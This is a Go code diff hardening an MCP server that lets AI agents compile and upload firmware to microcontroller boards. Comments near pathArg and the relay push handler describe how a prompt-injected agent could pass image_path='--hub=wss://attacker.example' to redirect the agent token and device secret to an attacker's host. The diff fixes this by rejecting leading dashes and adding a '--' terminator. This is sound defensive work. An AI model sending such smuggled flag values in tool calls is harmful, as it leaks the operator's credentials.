@@ -113,6 +113,40 @@ func strArg(args map[string]any, key string) string {
 	return ""
 }
 
+// pathArg is strArg for anything that ends up as a path the agent controls.
+//
+// A value beginning with "-" is refused outright. These values are appended to
+// a cobra command line, and a prompt-injected agent can supply
+// image_path="--hub=wss://elsewhere.example": pflag takes the LAST occurrence
+// of a repeated flag, so that overrides the --hub the server chose and sends
+// the agents token and the per-device secret to a host of the attacker's
+// choosing — while the docs promise secrets never cross this interface.
+// Rejecting the shape is deliberate; there is no legitimate path that starts
+// with a dash.
+func pathArg(args map[string]any, key string) (string, error) {
+	v := strArg(args, key)
+	if v == "" {
+		return "", nil
+	}
+	if strings.HasPrefix(v, "-") {
+		return "", fmt.Errorf(
+			"%s must be a path, not a flag: %q looks like a command-line option and was refused",
+			key, v)
+	}
+	return v, nil
+}
+
+// positionalArgs renders agent-supplied values as positional arguments,
+// protected by a "--" terminator so the flag parser stops before them.
+// Combined with pathArg's rejection of leading dashes this closes the
+// injection route; the terminator alone would already be enough, and both
+// together mean neither a missing nor a future terminator re-opens it.
+func positionalArgs(vals ...string) []string {
+	out := make([]string, 0, len(vals)+1)
+	out = append(out, "--")
+	return append(out, vals...)
+}
+
 func boolArg(args map[string]any, key string) bool {
 	v, _ := args[key].(bool)
 	return v
@@ -140,7 +174,7 @@ func intArg(args map[string]any, key string) (int, bool) {
 // client then sees garbage between responses). So os.Stdout/os.Stderr are
 // swapped for pipes for the duration of the call and restored afterwards.
 // Callers hold callMu, so the process-global swap is never concurrent.
-func runCLI(c *cobra.Command, args []string) (string, error) {
+func runCLI(ctx context.Context, c *cobra.Command, args []string) (string, error) {
 	var cobraBuf bytes.Buffer
 	c.SetOut(&cobraBuf)
 	c.SetErr(&cobraBuf)
@@ -149,13 +183,13 @@ func runCLI(c *cobra.Command, args []string) (string, error) {
 	origOut, origErr := os.Stdout, os.Stderr
 	outR, outW, err := os.Pipe()
 	if err != nil {
-		return "", c.Execute()
+		return "", c.ExecuteContext(ctx)
 	}
 	errR, errW, err := os.Pipe()
 	if err != nil {
 		outR.Close()
 		outW.Close()
-		return "", c.Execute()
+		return "", c.ExecuteContext(ctx)
 	}
 	os.Stdout, os.Stderr = outW, errW
 
@@ -165,7 +199,7 @@ func runCLI(c *cobra.Command, args []string) (string, error) {
 	go func() { io.Copy(&outBuf, outR); close(outDone) }()
 	go func() { io.Copy(&errBuf, errR); close(errDone) }()
 
-	runErr := c.Execute()
+	runErr := c.ExecuteContext(ctx)
 
 	outW.Close()
 	errW.Close()
@@ -219,7 +253,7 @@ func (s *mcpServer) defaultTools() []*mcpTool {
 				"when an upload is about to fail.",
 			InputSchema: map[string]any{"type": "object", "properties": map[string]any{}},
 			handler: func(ctx context.Context, args map[string]any) (string, error) {
-				return runCLI(newDoctorCmd(), nil)
+				return runCLI(ctx, newDoctorCmd(), nil)
 			},
 		},
 		{
@@ -228,7 +262,7 @@ func (s *mcpServer) defaultTools() []*mcpTool {
 				"an Uno/ESP32/STM32 board).",
 			InputSchema: map[string]any{"type": "object", "properties": map[string]any{}},
 			handler: func(ctx context.Context, args map[string]any) (string, error) {
-				return runCLI(newBoardCmd(), []string{"list-ports"})
+				return runCLI(ctx, newBoardCmd(), []string{"list-ports"})
 			},
 		},
 		{
@@ -236,7 +270,7 @@ func (s *mcpServer) defaultTools() []*mcpTool {
 			Description: "List installed board platforms and their versions.",
 			InputSchema: map[string]any{"type": "object", "properties": map[string]any{}},
 			handler: func(ctx context.Context, args map[string]any) (string, error) {
-				return runCLI(newBoardCmd(), []string{"list"})
+				return runCLI(ctx, newBoardCmd(), []string{"list"})
 			},
 		},
 		{
@@ -254,9 +288,14 @@ func (s *mcpServer) defaultTools() []*mcpTool {
 				"required": []string{"fqbn"},
 			},
 			handler: func(ctx context.Context, args map[string]any) (string, error) {
+				dir, err := pathArg(args, "sketch_dir")
+				if err != nil {
+					return "", err
+				}
 				var a []string
-				if dir := strArg(args, "sketch_dir"); dir != "" {
-					a = append(a, dir)
+				if dir != "" {
+					// sketch_dir is positional, so it must follow "--".
+					a = positionalArgs(dir)
 				}
 				a = append(a, "--fqbn", strArg(args, "fqbn"))
 				if m := strArg(args, "main_ino"); m != "" {
@@ -265,7 +304,7 @@ func (s *mcpServer) defaultTools() []*mcpTool {
 				if boolArg(args, "export_binaries") {
 					a = append(a, "--export-binaries")
 				}
-				return runCLI(newCompileCmd(), a)
+				return runCLI(ctx, newCompileCmd(), a)
 			},
 		},
 		{
@@ -287,15 +326,22 @@ func (s *mcpServer) defaultTools() []*mcpTool {
 			},
 			destructive: true,
 			handler: func(ctx context.Context, args map[string]any) (string, error) {
+				dir, err := pathArg(args, "sketch_dir")
+				if err != nil {
+					return "", err
+				}
+				bin, err := pathArg(args, "binary")
+				if err != nil {
+					return "", err
+				}
 				var a []string
-				if dir := strArg(args, "sketch_dir"); dir != "" {
-					a = append(a, dir)
+				if dir != "" {
+					// sketch_dir is positional, so it must follow "--".
+					a = positionalArgs(dir)
 				}
-				if b := strArg(args, "binary"); b != "" {
-					a = append(a, "--binary", b)
-				}
-				if f := strArg(args, "fqbn"); f != "" {
-					a = append(a, "--fqbn", f)
+				a = append(a, "--fqbn", strArg(args, "fqbn"))
+				if bin != "" {
+					a = append(a, "--binary", bin)
 				}
 				if m := strArg(args, "mcu"); m != "" {
 					a = append(a, "--mcu", m)
@@ -309,7 +355,7 @@ func (s *mcpServer) defaultTools() []*mcpTool {
 				if bd, ok := intArg(args, "baud"); ok {
 					a = append(a, fmt.Sprintf("--baud=%d", bd))
 				}
-				return runCLI(newUploadCmd(), a)
+				return runCLI(ctx, newUploadCmd(), a)
 			},
 		},
 		{
@@ -322,7 +368,7 @@ func (s *mcpServer) defaultTools() []*mcpTool {
 				if s.hub == "" {
 					return "", fmt.Errorf("no relay hub configured — start the server with --hub wss://your-host")
 				}
-				return runCLI(newRelayCmd(), []string{"devices", "--hub", s.hub})
+				return runCLI(ctx, newRelayCmd(), []string{"devices", "--hub", s.hub})
 			},
 		},
 		{
@@ -349,6 +395,16 @@ func (s *mcpServer) defaultTools() []*mcpTool {
 				if device == "" || image == "" {
 					return "", fmt.Errorf("device and image_path are both required")
 				}
+				// image_path is agent-controlled and lands on the command line.
+				// Without this, a prompt-injected agent passes
+				// image_path="--hub=wss://attacker.example" and pflag takes the
+				// LAST --hub, overriding the one this server was started with —
+				// sending the agents token and the device secret to a host the
+				// operator never configured.
+				image, err := pathArg(args, "image_path")
+				if err != nil {
+					return "", err
+				}
 				// Check the credential BEFORE dialling the hub. Without this the
 				// agent only sees "device secret required (pass --device-secret)",
 				// which is a CLI flag it cannot set and says nothing about the
@@ -359,8 +415,11 @@ func (s *mcpServer) defaultTools() []*mcpTool {
 							"It is the per-board provisioning secret (printed by the board on first boot). " +
 							"Export it before starting the server — it is deliberately never passed through this interface.")
 				}
-				return runCLI(newRelayCmd(),
-					[]string{"push", "--hub", s.hub, "--device", device, image})
+				// "--" so the image path after it can never be read as a flag,
+				// even if pathArg's check is ever loosened.
+				return runCLI(ctx, newRelayCmd(), append(
+					[]string{"push", "--hub", s.hub, "--device", device},
+					positionalArgs(image)...))
 			},
 		},
 	}
@@ -504,7 +563,18 @@ func (s *mcpServer) runTool(ctx context.Context, tool *mcpTool, args map[string]
 		err  error
 	}
 	done := make(chan outcome, 1)
+	finished := make(chan struct{})
 	go func() {
+		// This recover MUST live in this goroutine. A panic on one goroutine
+		// cannot be recovered by its parent — it takes the whole process down,
+		// killing the MCP server and the agent's session with it. The caller's
+		// recover() only ever sees panics raised on the caller's own stack.
+		defer close(finished)
+		defer func() {
+			if r := recover(); r != nil {
+				done <- outcome{err: fmt.Errorf("tool %s panicked: %v", tool.Name, r)}
+			}
+		}()
 		text, err := tool.handler(ctx, args)
 		done <- outcome{text, err}
 	}()
@@ -519,7 +589,15 @@ func (s *mcpServer) runTool(ctx context.Context, tool *mcpTool, args map[string]
 			"content": []map[string]any{{"type": "text", "text": res.text}},
 		}
 	case <-ctx.Done():
+		// Answer the agent now, but do NOT release callMu yet. The handler is
+		// still running: it may be inside runCLI, which swaps the
+		// process-global os.Stdout/os.Stderr. Releasing the lock here would let
+		// the next call start, and two calls interleaving those globals can
+		// leave them pointing at a pipe that is already closed — after which
+		// the server writes to a dead fd and every transcript is lost.
+		// Holding the lock until the work genuinely stops serialises the swap.
 		fail(fmt.Sprintf("%s timed out: %v", tool.Name, ctx.Err()))
+		<-finished
 	}
 }
 
